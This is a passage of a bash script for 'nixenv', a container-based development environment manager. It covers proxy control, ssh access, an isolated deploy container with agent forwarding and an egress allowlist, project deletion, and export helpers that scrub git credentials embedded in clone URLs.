      echo "   note:   *.localhost auto-resolves to 127.0.0.1 in Chrome/Firefox (Safari needs an /etc/hosts line)"
      ;;
    reload)
      # Regenerate Caddyfile + squid.conf and hot-reload both IN the running
      # container — no recreate, so relayed ssh/zmx sessions survive. Covers
      # routing/isolation (accept-from) and allowlists; NEW published ports or
      # relays (a project newly restricted, a <project>/ports edit) still need
      # 'proxy up', since published ports are fixed at container creation.
      container_running "$PROXY_NAME" || die "proxy not running — start it with '$0 proxy up'"
      local rcert=0 rp
      [ -f "$PROXY_DIR/certs/wildcard.pem" ] && rcert=1
      write_egress_configs
      write_caddyfile "$rcert"
      for rp in $EGRESS_PROJECTS; do
        "$ENGINE" network connect "$(internal_net "$rp")" "$PROXY_NAME" >/dev/null 2>&1 || true
      done
      # Egress: reloaded in place; created/recreated only when it is missing or
      # the capture UI port has to appear/disappear.
      egress_up
      "$ENGINE" network connect "$EGRESS_NET" "$PROXY_NAME" >/dev/null 2>&1 || true
      # caddy logs JSON to stderr even on success: show it only on failure.
      local rout
      rout="$("$ENGINE" exec "$PROXY_NAME" "$PROFILE/bin/caddy" reload \
          --config /etc/caddy/Caddyfile --adapter caddyfile 2>&1)" \
        || { printf '%s\n' "$rout" >&2; die "caddy rejected the new config (the old one stays active) — see '$0 proxy logs'"; }
      ok "proxy config reloaded (no restart)"
      ;;
    stop|down)
      "$ENGINE" rm -f "$PROXY_NAME" >/dev/null 2>&1 && ok "proxy stopped" || log "proxy not running"
      if container_exists "$EGRESS_NAME"; then
        "$ENGINE" rm -f "$EGRESS_NAME" >/dev/null 2>&1 || true
        ok "egress proxy stopped (restricted projects have no network until '$0 proxy up')"
      fi
      ;;
    status)
      if container_running "$PROXY_NAME"; then ok "proxy running as '$PROXY_NAME'"
      else warn "proxy not running — start with '$0 proxy up'"; fi
      if container_running "$EGRESS_NAME"; then ok "egress proxy running as '$EGRESS_NAME' (squid :$EGRESS_PORT)"
      else log "egress proxy not running (only needed by restricted projects)"; fi
      local cp_list="" rp
      for rp in "$PROJECTS_DIR"/*/; do
        [ -f "${rp}capture" ] && cp_list="$cp_list $(basename "$rp")"
      done
      [ -n "$cp_list" ] && echo "   capture:$cp_list  (UI: $0 capture <project> web)"
      echo "   domain: *.$PROXY_DOMAIN → nixenv-<project>:<port>"
      echo "   net:    $PROXY_NET"
      if [ -f "$PROXY_DIR/certs/wildcard.pem" ]; then
        echo "   tls:    mkcert wildcard cert at $PROXY_DIR/certs/wildcard.pem"
      else
        echo "   tls:    Caddy internal CA (no mkcert wildcard cert present)"
      fi
      "$ENGINE" ps --filter "network=$PROXY_NET" --format '   on-net: {{.Names}}' 2>/dev/null || true
      ;;
    renew)
      # Reissue the wildcard cert: drop the old files and let 'up' regenerate +
      # reload. The CA is already installed, so this does NOT prompt.
      rm -f "$PROXY_DIR/certs/wildcard.pem" "$PROXY_DIR/certs/wildcard-key.pem"
      log "removed the old wildcard cert — reissuing and reloading the proxy"
      cmd_proxy up
      ;;
    remove-cert|rm-cert)
      # Remove just nixenv's cert files → next 'up' falls back to Caddy internal CA.
      # This does NOT touch mkcert's CA (which may sign your other certs).
      rm -f "$PROXY_DIR/certs/wildcard.pem" "$PROXY_DIR/certs/wildcard-key.pem"
      ok "removed nixenv's wildcard cert from $PROXY_DIR/certs"
      log "run '$0 proxy up' to restart on Caddy's internal CA"
      if have mkcert; then
        log "to ALSO remove mkcert's local CA from your trust stores (affects ALL your"
        log "mkcert certs, may ask for your password), run yourself:  mkcert -uninstall"
      fi
      ;;
    logs)
      case "${2:-}" in
        egress) exec "$ENGINE" logs -f "$EGRESS_NAME";;
        "")     exec "$ENGINE" logs -f "$PROXY_NAME";;
        *)      die "usage: $0 proxy logs [egress]";;
      esac
      ;;
    *) die "usage: $0 proxy [up|reload|stop|status|logs [egress]|renew|remove-cert]";;
  esac
}

# =============================================================================
# ssh-config — print (or --install) the ~/.ssh/config Include that picks up every
# project's generated ssh/config, enabling `ssh <project>` / `ssh <project>.<x>`.
# =============================================================================
cmd_ssh_config() {
  local inc="Include ~/.nixenv/projects/*/ssh/config"
  case "${1:-}" in
    ""|--print)
      log "Add this near the TOP of ~/.ssh/config (or run: $0 ssh-config --install):"
      echo "    $inc"
      log "Then: ssh <project>   (or ssh <project>.<session>)"
      ;;
    --install)
      local f="$HOME/.ssh/config"
      mkdir -p "$HOME/.ssh"; chmod 700 "$HOME/.ssh"; touch "$f"
      if grep -qF "$inc" "$f" 2>/dev/null; then
        ok "already present in $f"
      else
        printf '%s\n\n%s' "$inc" "$(cat "$f")" > "$f.tmp" && mv "$f.tmp" "$f"
        ok "added to $f:  $inc"
      fi
      ;;
    *) die "usage: $0 ssh-config [--install]";;
  esac
}

# =============================================================================
# projects — list initialised projects
# =============================================================================
cmd_projects() {
  resolve_engine 2>/dev/null || true
  if [ -d "$PROJECTS_DIR" ] && [ -n "$(ls -A "$PROJECTS_DIR" 2>/dev/null)" ]; then
    log "Projects in $PROJECTS_DIR:"
    local d name port state
    for d in "$PROJECTS_DIR"/*/; do
      [ -d "$d" ] || continue
      name="$(basename "$d")"
      port="$( [ -f "$d/port" ] && cat "$d/port" || echo '—' )"
      state="stopped"
      have "$ENGINE" && container_running "$(container_name "$name")" && state="running"
      printf '   • %-20s ssh port %-6s [%s]\n' "$name" "$port" "$state"
    done
  else
    warn "No projects yet — create one with '$0 init <project>'"
  fi
}

# =============================================================================
# up — build (if needed) then run a project
#   usage: up <project>
# =============================================================================
cmd_up() {
  require_engine
  local name="${1:-}"
  [ -n "$name" ] || die "usage: $0 up <project>"
  if store_is_populated 2>/dev/null; then
    ok "Store already populated — skipping build"
  else
    cmd_build
  fi
  cmd_run "$@"
}

# =============================================================================
# shell — interactive zsh inside the running service container (via docker exec)
# =============================================================================
cmd_shell() {
  require_engine
  local name="${1:-}"; [ -n "$name" ] || die "usage: $0 shell <project>"
  case "$name" in */*|.|..) die "invalid project name: $name";; esac

  local cname appmnt; cname="$(container_name "$name")"
  appmnt="$(project_app_mount "$name")"
  container_running "$cname" || cmd_run "$name"

  # No -u: the container already runs as our uid, so exec inherits it. (Passing
  # -u app would need 'app' resolvable in the daemon's view of /etc/passwd, which
  # a bind-mounted passwd isn't, reliably.)
  exec "$ENGINE" exec -it -w "$appmnt" \
    -e HOME="/home/$APP_USER" -e TERM="${TERM:-xterm-256color}" \
    "$cname" "$PROFILE/bin/zsh" -l
}

# =============================================================================
# ssh — SSH into the running service container on its assigned port
# =============================================================================
cmd_ssh() {
  require_engine
  local name="${1:-}"; [ -n "$name" ] || die "usage: $0 ssh <project>"
  case "$name" in */*|.|..) die "invalid project name: $name";; esac

  command -v ssh >/dev/null 2>&1 || die "host 'ssh' client not found"
  local cname port; cname="$(container_name "$name")"
  container_running "$cname" || cmd_run "$name"
  port="$(project_port "$name")"
  sleep 1   # give sshd a moment to come up on first start
  log "Connecting to '$name' on port $port"
  local pdir; pdir="$(project_dir "$name")"
  ensure_project_ssh_key "$pdir"
  exec ssh -p "$port" -i "$pdir/ssh/id_ed25519" -o IdentitiesOnly=yes \
    -o StrictHostKeyChecking=yes -o HostKeyAlias="$(ssh_host_alias "$name")" \
    -o UserKnownHostsFile="$pdir/ssh/known_hosts" \
    "$APP_USER@127.0.0.1"
}

# =============================================================================
# deploy — a THROWAWAY container to deploy from, holding your forwarded agent.
#   usage: deploy <project> [--agent=<socket>|--no-agent] [-- <command>…]
#          deploy <project> allow <host>…   add to <project>/deploy_hosts
#          deploy <project> hosts           show what deploy can reach
#          deploy <project> log [-f]        its egress log
#          deploy <project> stop            remove a leftover deploy container
# =============================================================================
# The dev container is where untrusted code (and Claude) runs, so the agent is
# never forwarded there. The deploy container:
#   * mounts the app volume read-write (a release edits, commits and pushes
#     there) and nothing else of the project's state: no home volume, no
#     Claude profile. Same tools as the dev container. From the HOST side it
#     adds your git identity + https credentials (the home seed), and
#     deploy_gitconfig / deploy_ssh_config / deploy_known_hosts (rw);
#   * has a tmpfs HOME, so nothing else survives the session;
#   * sits on its own --internal network, whose only exit is squid with the
#     project's allowed_hosts + <project>/deploy_hosts — production goes in
#     the second, so the dev container can't reach it;
#   * runs sshd on loopback only. The host connects with
#     ProxyCommand '<engine> exec -i … socat', so it needs no published port or
#     relay, and the agent rides the ssh session — the one way to hand a
#     container your agent that works the same on Docker Desktop, Linux and podman.
# The code is shared with the dev container, which can change it at any time:
# running its scripts here runs them with your agent. Review what you run.
cmd_deploy() {
  local name="${1:-}"
  [ -n "$name" ] || die "usage: $0 deploy <project> [--agent=<socket>|--no-agent] [-- <command>…]   (or: allow|hosts|log|stop)"
  # Strict charset, not just the path check: the container name is spliced into
  # ssh's ProxyCommand, which ssh runs through a shell.
  valid_project_name "$name" || die "invalid project name: $name"
  shift
  [ -d "$(project_dir "$name")" ] || die "unknown project '$name' — run '$0 init $name' first"
  case "${1:-}" in
    allow) shift; deploy_allow "$name" "$@";;
    hosts)
      local h; h="$(deploy_hosts "$name")"
      echo "── deploy only ($(project_dir "$name")/deploy_hosts) ──"
      if [ -n "$h" ]; then printf '   %s\n' $h
      else echo "   (none — add with: $0 deploy $name allow <host>…)"; fi
      echo "── from the dev allowlist (allowed_hosts) ──"
      h="$(deploy_allowlist "$name" | grep -vxF -f <(deploy_hosts "$name"; echo) || true)"
      if [ -n "$h" ]; then printf '   %s\n' $h; else echo "   (none)"; fi;;
    log)  shift; require_engine; deploy_log "$name" "${1:-}";;
    stop)
      require_engine
      local c; c="$(deploy_container_name "$name")"
      if container_exists "$c"; then "$ENGINE" rm -f "$c" >/dev/null && ok "Removed '$c'"
      else warn "no deploy container for '$name'"; fi;;
    *) require_engine; deploy_open "$name" "$@";;
  esac
}

deploy_allow() {
  local name="$1" pdir f d nd; shift
  [ "$#" -gt 0 ] || die "usage: $0 deploy $name allow <domain|ip>…"
  pdir="$(project_dir "$name")"; f="$pdir/deploy_hosts"
  [ ! -L "$f" ] || die "$f is a symlink — refusing to use it (replace it with a regular file)"
  touch "$f"
  for d in "$@"; do
    [ -n "$(printf '%s' "$d" | tr -d '[:space:]')" ] || continue
    nd="$(normalize_allowed_host "$d")" \
      || die "invalid host '$d' (domain, .domain for subdomains, or IP — no schemes/ports/paths)"
    if grep -qxF "$nd" "$f" 2>/dev/null; then
      warn "already allowed for deploy: $nd"
    elif grep -qxF "$nd" "$pdir/allowed_hosts" 2>/dev/null; then
      warn "$nd is in the dev allowlist — deploy can already reach it"
    else
      printf '%s\n' "$nd" >> "$f"; ok "deploy host: $nd"
    fi
  done
  if resolve_engine 2>/dev/null && container_running "$EGRESS_NAME"; then
    write_egress_configs
    egress_up && ok "deploy allowlist reloaded (hot — no proxy restart)"
  else
    log "applies at the next '$0 deploy $name'"
  fi
}

deploy_log() {
  local name="$1" follow="$2" logf="$EGRESS_DATA_DIR/egress.log" prefix
  [ -f "$logf" ] || die "no egress log at $logf yet"
  prefix="$(net_subnet "$(deploy_net "$name")" 2>/dev/null | cut -d/ -f1 | sed 's/\.0*$//')"
  [ -n "$prefix" ] || die "no deploy network for '$name' yet — run '$0 deploy $name' first"
  if [ "$follow" = "-f" ]; then
    log "following deploy egress for '$name' (Ctrl-C to stop)"
    exec tail -f "$logf" | grep --line-buffered "$prefix"
  fi
  grep "$prefix" "$logf" | tail -30 || warn "no deploy egress logged yet"
}

# ssh argv for a deploy session, in DEPLOY_SSH (an array: paths may hold
# spaces). -F /dev/null: the user's ~/.ssh/config must not leak in — a
# 'Host *' ControlMaster would let a later, unrelated session reuse this one.
deploy_ssh_argv() {
  local name="$1" cname="$2" agent="$3" pdir fwd; pdir="$(project_dir "$name")"
  case "$agent" in
    yes|no) fwd="ForwardAgent=$agent";;
    *)      fwd="ForwardAgent=\"$agent\"";;   # quoted: ssh parses -o like a config line
  esac
  DEPLOY_SSH=(ssh -F /dev/null
    -i "$pdir/ssh/id_ed25519" -o IdentitiesOnly=yes
    -o StrictHostKeyChecking=yes -o HostKeyAlias="$(ssh_host_alias "$name")"
    -o UserKnownHostsFile="$pdir/ssh/known_hosts"
    -o ControlMaster=no -o ControlPath=none -o LogLevel=ERROR
    -o "ProxyCommand=$ENGINE exec -i $cname $PROFILE/bin/socat - TCP:127.0.0.1:$SSHD_PORT"
    -o "$fwd")
}

deploy_open() {
  local name="$1"; shift
  local agent="${NIXENV_DEPLOY_AGENT:-yes}" cmd; cmd=()
  while [ "$#" -gt 0 ]; do
    case "$1" in
      --agent=*) agent="${1#--agent=}";;
      --no-agent) agent=no;;
      --) shift; cmd=("$@"); break;;
      *) die "unknown option '$1' — usage: $0 deploy $name [--agent=<socket>|--no-agent] [-- <command>…]";;
    esac
    shift
  done
  case "$agent" in "~/"*) agent="$HOME/${agent#"~/"}";; esac
  case "$agent" in
    yes) [ -n "${SSH_AUTH_SOCK:-}" ] || warn "SSH_AUTH_SOCK is not set — no agent to forward (use --agent=<socket>)";;
    no)  ;;
    *)   [ -S "$agent" ] || die "--agent: '$agent' is not a socket";;
  esac
  command -v ssh >/dev/null 2>&1 || die "host 'ssh' client not found"

  volume_exists || die "volume '$NIX_VOLUME' missing — run '$0 build' first"
  store_is_populated || die "shared profile not found in volume — run '$0 build' first"
  [ -f "$DEPLOY_ENTRYPOINT_FILE" ] || die "missing deploy entrypoint at $DEPLOY_ENTRYPOINT_FILE"

  local pdir cname appv appmnt _mf; pdir="$(project_dir "$name")"
  cname="$(deploy_container_name "$name")"
  appv="$(app_volume "$name")"; appmnt="$(project_app_mount "$name")"
  for _mf in app_mount allowed_hosts deploy_hosts deploy_ssh_config deploy_gitconfig deploy_known_hosts \
             home/.gitconfig.identity home/.gitconfig.credentials home/.git-credentials; do
    [ ! -L "$pdir/$_mf" ] || die "$pdir/$_mf is a symlink — refusing to use it (replace it with a regular file)"
  done
  valid_app_mount "$appmnt" || die "invalid app path in $pdir/app_mount"
  vol_exists "$appv" || die "no app volume '$appv' — '$0 run $name' creates it"
  if container_exists "$cname"; then
    die "a deploy session for '$name' is already open — close it, or remove a leftover one: $0 deploy $name stop"
  fi

  write_passwd_files "$pdir"
  ensure_project_ssh_key "$pdir"   # same key + pinned host key as 'ssh <project>'

  ensure_deploy_net "$name"
  local egress_env; egress_env=()
  if [ -f "$pdir/deploy_hosts" ] && [ -n "$(deploy_allowlist "$name")" ]; then
    write_egress_configs
    egress_up || die "the egress proxy did not start — the deploy container would have no network"
    egress_env=(-e NIXENV_EGRESS_PROXY="http://$EGRESS_NAME:$EGRESS_PORT")
  else
    warn "no deploy allowlist — the deploy container has NO network (enable: $0 deploy $name allow <host>…)"
  fi

  # Host-side files only: the dev container can write none of them.
  touch "$pdir/deploy_known_hosts"; chmod 600 "$pdir/deploy_known_hosts"
  local extra _g; extra=(-v "$pdir/deploy_known_hosts:/etc/nixenv/known_hosts")
  if [ -f "$pdir/deploy_ssh_config" ]; then
    extra+=(-v "$pdir/deploy_ssh_config:/etc/nixenv/deploy_ssh_config:ro")
  fi
  if [ -f "$pdir/deploy_gitconfig" ]; then
    extra+=(-v "$pdir/deploy_gitconfig:/etc/nixenv/deploy_gitconfig:ro")
  fi
  # Git identity + https credentials: the seed's own files, shared (not
  # copied). .git-credentials is rw — the store helper rewrites it.
  [ -f "$pdir/home/.gitconfig.identity" ] && \
    extra+=(-v "$pdir/home/.gitconfig.identity:/home/$APP_USER/.gitconfig.identity:ro")
  [ -f "$pdir/home/.gitconfig.credentials" ] && \
    extra+=(-v "$pdir/home/.gitconfig.credentials:/home/$APP_USER/.gitconfig.credentials:ro")
  [ -f "$pdir/home/.git-credentials" ] && \
    extra+=(-v "$pdir/home/.git-credentials:/home/$APP_USER/.git-credentials")
  local harden uid gid; harden=($(container_hardening_args)); uid="$(id -u)"; gid="$(id -g)"
  log "Starting '$cname' — $appv → $appmnt, home on tmpfs"
  "$ENGINE" run -d --rm \
    --name "$cname" \
    --hostname "$name-deploy" \
    --network "$(deploy_net "$name")" \
    --user "$uid:$gid" \
    $(engine_userns) \
    ${harden[@]+"${harden[@]}"} \
    --tmpfs "/home/$APP_USER:rw,exec,nosuid,nodev,mode=0700,uid=$uid,gid=$gid" \
    ${egress_env[@]+"${egress_env[@]}"} \
    ${extra[@]+"${extra[@]}"} \
    -v "$NIX_VOLUME":/nix:ro \
    -v "$appv":"$appmnt" \
    -v "$HOME_SKEL":/etc/nixenv/home-skel:ro \
    -v "$pdir/passwd":/etc/passwd:ro \
    -v "$pdir/group":/etc/group:ro \
    -v "$pdir/shadow":/etc/shadow:ro \
    -v "$pdir/ssh/authorized_keys":/etc/nixenv/authorized_keys:ro \
    -v "$pdir/ssh/host_ed25519_key":/etc/nixenv/ssh_host_ed25519_key:ro \
    -v "$DEPLOY_ENTRYPOINT_FILE":/usr/local/bin/nixenv-deploy-entrypoint:ro \
    -w "$appmnt" \
    -e HOME=/home/"$APP_USER" \
    -e PROFILE="$PROFILE" \
    -e APP_USER="$APP_USER" \
    -e SSHD_PORT="$SSHD_PORT" \
    -e NIXENV_PROJECT="$name" \
    -e NIXENV_APP_MOUNT="$appmnt" \
    -e NIXENV_EXTRA_PROFILE="$(project_profile "$name")" \
    "$(img "$RUNTIME_IMAGE")" \
    sh /usr/local/bin/nixenv-deploy-entrypoint >/dev/null \
    || die "failed to start the deploy container"
  # From here on, whatever happens, the container (and the agent socket in
  # it) goes away with this command.
  trap '"$ENGINE" rm -f "'"$cname"'" >/dev/null 2>&1 || true' EXIT
  trap 'exit 130' INT TERM

  local i=0
  until "$ENGINE" exec "$cname" "$PROFILE/bin/socat" -u OPEN:/dev/null "TCP:127.0.0.1:$SSHD_PORT" >/dev/null 2>&1; do
    i=$((i + 1))
    if [ "$i" -gt 40 ] || ! container_running "$cname"; then
      "$ENGINE" logs "$cname" 2>&1 | tail -20 >&2 || true
      die "the deploy container's sshd did not come up"
    fi
    sleep 0.25
  done

  deploy_ssh_argv "$name" "$cname" "$agent"
  warn "$appmnt is shared with the dev container, which can change it — review scripts before running them with your agent"
  log "deploy shell for '$name' (agent: $agent) — exit to destroy the container"
  local rc=0
  if [ "${#cmd[@]}" -gt 0 ]; then
    "${DEPLOY_SSH[@]}" "$APP_USER@$name-deploy" "${cmd[@]}" || rc=$?
  else
    "${DEPLOY_SSH[@]}" -t "$APP_USER@$name-deploy" || rc=$?
  fi
  "$ENGINE" rm -f "$cname" >/dev/null 2>&1 || true
  trap - EXIT INT TERM
  ok "deploy container removed"
  return "$rc"
}

# =============================================================================
# stop — stop and remove a project's service container
# =============================================================================
cmd_stop() {
  require_engine
  local name="${1:-}"

  # No project → stop EVERYTHING nixenv started: all project containers and the
  # shared proxy. Matches on the container prefix, so nothing else is touched.
  if [ -z "$name" ]; then
    local all
    all="$("$ENGINE" ps -a --format '{{.Names}}' \
            | grep -E "^${CONTAINER_PREFIX}(-|__)" || true)"
    if [ -z "$all" ]; then
      warn "nothing to stop (no '${CONTAINER_PREFIX}-*' containers)"
      return 0
    fi
    log "Stopping all nixenv containers:"
    printf '   %s\n' $all
    # shellcheck disable=SC2086
    "$ENGINE" rm -f $all >/dev/null 2>&1 || true
    ok "Stopped $(printf '%s\n' $all | wc -l | tr -d ' ') container(s)"
    log "volumes and projects are untouched — '$0 run <project>' starts one again"
    return 0
  fi

  case "$name" in */*|.|..) die "invalid project name: $name";; esac
  local cname dname; cname="$(container_name "$name")"; dname="$(deploy_container_name "$name")"
  if container_exists "$dname"; then
    "$ENGINE" rm -f "$dname" >/dev/null && ok "Removed deploy container '$dname'"
  fi
  container_exists "$cname" || { warn "no container '$cname' (already stopped)"; return 0; }
  "$ENGINE" rm -f "$cname" >/dev/null && ok "Stopped '$cname'"
}

# =============================================================================
# delete — permanently remove a project: container(s), code volume, home dir.
#          Prints the exact commands and asks for confirmation before running.
# =============================================================================
cmd_delete() {
  local name="${1:-}"
  [ -n "$name" ] || die "usage: $0 delete <project>"
  case "$name" in */*|.|..) die "invalid project name: $name";; esac
  resolve_engine || true   # host files can be removed even without an engine

  local pdir cname prof appv homev dbv vols=""
  pdir="$(project_dir "$name")"
  cname="$(container_name "$name")"
  prof="$(project_profile "$name")"
  appv="$(app_volume "$name")"; homev="$(home_volume "$name")"; dbv="$(db_volume "$name")"
  if [ -n "$ENGINE" ]; then
    vol_exists "$appv"  && vols="$vols $appv"
    vol_exists "$homev" && vols="$vols $homev"
    vol_exists "$dbv"   && vols="$vols $dbv"
  fi

  [ -d "$pdir" ] || warn "no project dir at $pdir (will still try its container/volumes)"

  log "This will PERMANENTLY delete project '$name' by running:"
  if [ -n "$ENGINE" ]; then
    echo "    $ENGINE rm -f $cname $(deploy_container_name "$name")"
    [ -n "$vols" ] && echo "    $ENGINE volume rm$vols   (app + home + databases volumes)"
    echo "    rm -f $prof*   (its extra-tooling profile, inside the store)"
  else
    warn "no container engine detected — its container/volumes won't be removed"
  fi
  echo "    rm -rf $pdir   (home seed, SSH keys, stored git credentials, port)"
  echo "    rm -f $EGRESS_DATA_DIR/captures/$name.*   (recorded traffic, if any)"
  echo "    rm -rf $(claude_profile_dir "$name")   (its Claude settings; transcripts are kept)"
  warn "This cannot be undone (including all code in the app volume)."

  printf 'Proceed? [y/N] '
  local ans=""; read -r ans || true
  case "$ans" in
    [yY]|[yY][eE][sS]) ;;
    *) warn "Aborted — nothing deleted"; return 0 ;;
  esac

  if [ -n "$ENGINE" ]; then
    "$ENGINE" rm -f "$cname" "$(deploy_container_name "$name")" >/dev/null 2>&1 || true
    [ -n "$vols" ] && "$ENGINE" volume rm $vols >/dev/null 2>&1 || true
    # Egress internal network (restricted projects): detach both proxies, then remove.
    "$ENGINE" network disconnect "$(internal_net "$name")" "$PROXY_NAME" >/dev/null 2>&1 || true
    "$ENGINE" network disconnect "$(internal_net "$name")" "$EGRESS_NAME" >/dev/null 2>&1 || true
    "$ENGINE" network rm "$(internal_net "$name")" >/dev/null 2>&1 || true
    "$ENGINE" network disconnect "$(deploy_net "$name")" "$EGRESS_NAME" >/dev/null 2>&1 || true
    "$ENGINE" network rm "$(deploy_net "$name")" >/dev/null 2>&1 || true
    volume_exists && "$ENGINE" run --rm -v "$NIX_VOLUME":/nix "$(img "$BUILDER_IMAGE")" \
      sh -c "rm -f '$prof' '$prof'-*-link" >/dev/null 2>&1 || true
  fi
  rm -rf "$pdir"
  # A re-created project of the same name must not inherit these.
  rm -rf "$(claude_profile_dir "$name")"
  # Recorded traffic ('capture') can hold its tokens and cookies.
  rm -f "$EGRESS_DATA_DIR/captures/$name.flows" "$EGRESS_DATA_DIR/captures/$name.log"
  ok "Deleted project '$name'"
}

# =============================================================================
# sync-home — refresh a project's home config into an EXISTING home volume.
#   Layers, in order, WITHOUT touching installed nvim plugins, shell history, or
#   the generated git identity/credentials:
#     1. the embedded skeleton (nvim init.lua, .zshrc, .gitconfig, starship.toml,
#        .vimrc, .ssh/config) — the shared defaults;
#     2. project-specific overrides committed in the repo at <repo>/.nixenv/home/
# =============================================================================
# export / import — move a whole project between machines, or back it up
# =============================================================================
# An archive holds the THREE volumes (app, home, databases) plus the portable
# host-side state. It deliberately does NOT hold:
#   * the shared Nix store — gigabytes, and fully reproducible from the project's
#     flake + flake.lock by 'build';
#   * passwd/group/shadow and port/ssh/config — generated per machine, from your
#     uid and a free port. Restoring them verbatim onto a different uid gives a
#     container whose files it cannot write, and a port that may be taken.
#   * flake/ and etc-hosts — build artefacts, rebuilt on demand.
#
# Everything ELSE under <project>/ travels (meta/<same relative path>), so a
# project's configuration survives a move: egress, ports, hosts, extra engine
# parameters, deploy settings, your extra authorized keys, the home seed and
# its git identity. Import still treats all of it as untrusted (import_meta_files).
#
# Regenerated per machine, never exported:
#   * passwd/group/shadow, port, etc-hosts, flake/ — see above;
#   * the generated ssh/ files: config and known_hosts embed this machine's port
#     and paths, and the project's keys are re-created so an archive someone
#     hands you can't come with a key they also hold;
#   * capture, capture-trust — whether THIS machine's mitmproxy CA is trusted.
EXPORT_SKIP_PATHS="passwd group shadow port etc-hosts flake ssh/config ssh/known_hosts ssh/authorized_keys ssh/id_ed25519 ssh/id_ed25519.pub ssh/host_ed25519_key ssh/host_ed25519_key.pub capture capture-trust"
# Secrets in the home seed: exported only with --with-home, like the home volume.
EXPORT_SECRET_PATHS="home/.git-credentials home/.gitconfig.credentials home/.ssh"

# path_in_list <relative path> <list>: the path, or a dir it sits under, is listed.
path_in_list() {
  local p
  for p in $2; do
    case "$1" in "$p"|"$p"/*) return 0;; esac
  done
  return 1
}

# Regular files under <project>/ that an export carries, one relative path per
# line. $2=1 (--with-home) adds the seed's secrets.
export_project_files() {
  local pdir="$1" with_home="${2:-0}" rel
  ( cd "$pdir" && find . -type f ) | sed 's#^\./##' | LC_ALL=C sort | while IFS= read -r rel; do
    path_in_list "$rel" "$EXPORT_SKIP_PATHS" && continue
    if [ "$with_home" != 1 ] && path_in_list "$rel" "$EXPORT_SECRET_PATHS"; then continue; fi
    printf '%s\n' "$rel"
  done
}

# Outer archive is NOT gzipped: each volume inside is already a .tar.gz, so
# compressing twice costs time and saves nothing.
export_archive_default() { printf 'nixenv-%s-%s.tar' "$1" "$(date +%Y%m%d-%H%M%S)"; }

# Turn `tar -v`'s per-file listing into ONE self-updating line, so a multi-GB
# volume doesn't look like a hang. Reads the listing on stdin and reports to
# stderr; the archive itself goes to a mounted file inside the container, so the
# container's stdout is ours to consume.
#
# awk, not a bash `read` loop: a 200k-file volume is 200k lines, and bash would
# make the progress meter the slow part. Only every PROGRESS_EVERY-th line
# touches the terminal, for the same reason.
#
# No TTY (CI, piped) → periodic whole lines instead of \r, so logs stay readable.
# NIXENV_PROGRESS=0 silences it entirely.
PROGRESS_EVERY="${PROGRESS_EVERY:-200}"
progress_count() {
  local label="$1" tty=0
  if [ "${NIXENV_PROGRESS:-1}" = 0 ]; then cat >/dev/null; return 0; fi
  # if/fi, NOT `[ -t 2 ] && tty=1`: a false test makes the list return 1, which
  # is the set -e trap this repo has already been bitten by twice.
  if [ -t 2 ]; then tty=1; fi
  awk -v label="$label" -v tty="$tty" -v every="$PROGRESS_EVERY" '
    { n++
      if (n % every == 0) {
        if (tty)                  printf "\r   %s… %d files", label, n > "/dev/stderr"
        else if (n % 5000 == 0)   printf "   %s… %d files\n", label, n > "/dev/stderr"
        fflush()
      }
    }
    END {
      if (tty) printf "\r   %s… %d files\n", label, n+0 > "/dev/stderr"
      else     printf "   %s… %d files\n",   label, n+0 > "/dev/stderr"
      fflush()
    }'
}

# Human-readable size of a path, or "?" — du's flags differ enough between
# platforms that a failure here must never abort an export.
human_size() { du -h "$1" 2>/dev/null | cut -f1 | tail -1 || printf '?'; }

# key=value, one per line. Parsed with grep/cut — NEVER sourced: the file comes
# out of an archive we did not create.
manifest_get() {
  [ -f "$1" ] || return 1
  sed -n "s/^$2=//p" "$1" | head -1
}

# --- git credentials living in the APP volume --------------------------------
# A clone URL like https://user:token@host/repo.git is written verbatim into
# .git/config, so the app volume can carry a token even when the home volume
# (the usual place for secrets) is excluded. Both helpers below run in the
# runtime image because the volume is only reachable from a container.

# Prints offending "url = https://user:pass@host" lines, or nothing.
app_git_embedded_creds() {
  local appv; appv="$(app_volume "$1")"
  vol_exists "$appv" || return 0
  "$ENGINE" run --rm -v "$appv":/app:ro "$(img "$RUNTIME_IMAGE")" \
    sh -c 'grep -hoE "url *= *https?://[^/@]+:[^/@]+@[^[:space:]]*" /app/.git/config 2>/dev/null || true' \
    2>/dev/null || true
}

# Rewrites them in place to https://host/…, leaving the credential helper to
# supply the secret. ssh://git@host is untouched: that is a username, not a
# secret. Mounts rw ON PURPOSE — used only on a just-imported volume.
app_scrub_git_creds() {
  local appv; appv="$(app_volume "$1")"
  vol_exists "$appv" || return 0
  "$ENGINE" run --rm --user "$(id -u):$(id -g)" $(engine_userns) \
    -v "$appv":/app "$(img "$RUNTIME_IMAGE")" \
    sh -c 'f=/app/.git/config; [ -f "$f" ] || exit 0
           sed -i -E "s#(url *= *https?://)[^/@]+:[^/@]+@#\\1#g" "$f"' \
    >/dev/null 2>&1 || true
}

# Prints the origin remote URL from the app volume, or nothing.
app_git_remote() {
  local appv; appv="$(app_volume "$1")"
  vol_exists "$appv" || return 0
  # Parsed with sed, NOT `git config --get`: these helpers run in the bare
  # RUNTIME_IMAGE with no /nix mounted, and debian:stable-slim has no git. A
  # `git` call here silently returns nothing, which is exactly how the import
  # credential prompt came to be skipped for an https remote.
  "$ENGINE" run --rm -v "$appv":/app:ro "$(img "$RUNTIME_IMAGE")" \
    sh -c 'sed -n "/^\[remote \"origin\"\]/,/^\[/p" /app/.git/config 2>/dev/null \
           | sed -n "s/^[[:space:]]*url[[:space:]]*=[[:space:]]*//p" | head -1' \
    2>/dev/null || true
}

# Copy specific files from the host-side home seed into the home VOLUME. Needed
# when something is written to the seed AFTER ensure_volumes has already copied
# it — importing credentials, for instance, since the clone URL is only known
# once the app volume is restored.
sync_home_files() {
  local name="$1"; shift
  local pdir homev f list=""; pdir="$(project_dir "$name")"; homev="$(home_volume "$name")"
  for f in "$@"; do [ -f "$pdir/home/$f" ] && list="$list $f"; done
  [ -n "$list" ] || return 0
  "$ENGINE" run --rm --user "$(id -u):$(id -g)" $(engine_userns) \
    -v "$homev":/home/"$APP_USER" -v "$pdir/home":/seed:ro \
    "$(img "$RUNTIME_IMAGE")" \
    sh -c 'for f in '"$list"'; do cp "/seed/$f" "/home/'"$APP_USER"'/$f" || true; done
           [ -f "/home/'"$APP_USER"'/.git-credentials" ] && chmod 600 "/home/'"$APP_USER"'/.git-credentials"
           true' >/dev/null 2>&1 || true
}

cmd_export() {
  require_engine
  local name="" force=0 out="" with_home=0
  while [ "$#" -gt 0 ]; do
    case "$1" in
      --force) force=1;;
      --with-home) with_home=1;;
      -*) die "unknown option: $1";;
